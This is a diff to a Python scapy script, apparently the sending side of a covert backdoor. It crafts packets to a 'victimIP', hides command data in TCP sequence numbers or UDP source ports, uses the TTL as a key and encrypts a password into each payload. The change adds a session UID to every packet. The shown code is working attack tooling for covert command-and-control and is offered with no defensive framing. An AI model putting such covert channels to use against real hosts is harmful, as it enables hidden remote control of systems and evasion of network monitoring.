@@ -1,9 +1,10 @@
 from scapy.all import *
 from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
+import uuid #Used to generate UID's
 
 
 #Inputs
-victimIP = "192.168.0.15"
+victimIP = "192.168.0.2"
 ttlKey = 164
 srcPort = 80
 dstPort = 8000
@@ -51,7 +52,13 @@ def packetizeCommandData(command,length):
         output.append(commandData[(end+1):(end+1+excess)])
         return output
 
-def craftCommandPacket(data,protocol,position,total):
+
+def generateUID():
+    uid = uuid.uuid1()
+    print 'Made a UID ' + str(uid)
+    return str(uid)
+
+def craftCommandPacket(data,protocol,position,total,UID):
     global victimIP
     global ttlKey
     global srcPort
@@ -60,14 +67,15 @@ def craftCommandPacket(data,protocol,position,total):
     global IV
     global password
 
+
     print "Crafting packet for # " + str(position) + " / " + str(total)
     if(protocol == "TCP"):
         packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
-        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+str(position)+":" \
+        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
         + str(total)))
     elif(protocol == "UDP"):
         packet = IP(dst=victimIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
-        dport=dstPort)/Raw(load=encrypt(password+"\n" + str(position) + \
+        dport=dstPort)/Raw(load=encrypt(password+"\n"+UID+"\n"+ str(position) + \
          ":"+str(total)))
     return packet
 
@@ -75,8 +83,11 @@ def craftCommandPackets(data,protocol):
     packets = []
     #If the length of the number is larger than what is allowed in one packet, split it
     counter = 0
+    #Create a UID to put in every packet, so that we know what session the
+    #Packets are part of
+    UID = generateUID()
     while (counter < len(data)):
-        packets.append(craftCommandPacket(data[counter],protocol,counter+1,len(data)))
+        packets.append(craftCommandPacket(data[counter],protocol,counter+1,len(data),UID))
         counter = counter + 1
 
     return packets
